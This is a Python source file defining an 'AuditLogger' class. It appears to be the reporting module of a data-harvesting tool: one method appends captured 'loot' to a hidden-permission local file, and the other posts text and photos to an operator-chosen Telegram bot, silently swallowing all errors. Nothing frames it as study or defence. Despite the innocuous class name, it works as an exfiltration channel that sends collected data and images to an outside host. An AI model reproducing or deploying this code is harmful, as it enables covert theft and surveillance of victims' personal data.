import os
import json
import requests
from datetime import datetime

class AuditLogger:
    @staticmethod
    def get_dir():
        return os.path.dirname(os.path.abspath(__file__))

    @staticmethod
    def save_loot(data):
        file_path = os.path.join(AuditLogger.get_dir(), "auratrace_loot.txt")
        try:
            with open(file_path, "a", encoding="utf-8") as f:
                f.write(f"[{datetime.now()}] {data}\n{'-'*50}\n")
            os.chmod(file_path, 0o600)
        except Exception: 
            pass

    @staticmethod
    def send_alert(msg, img_path=None, token=None, chat_id=None):
        if not token or not chat_id: 
            return
        try:
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            requests.post(url, data={'chat_id': chat_id, 'text': msg}, timeout=5)
            if img_path and os.path.exists(img_path):
                with open(img_path, 'rb') as f:
                    requests.post(f"https://api.telegram.org/bot{token}/sendPhoto",
                                  data={'chat_id': chat_id}, files={'photo': f}, timeout=10)
        except Exception: 
            pass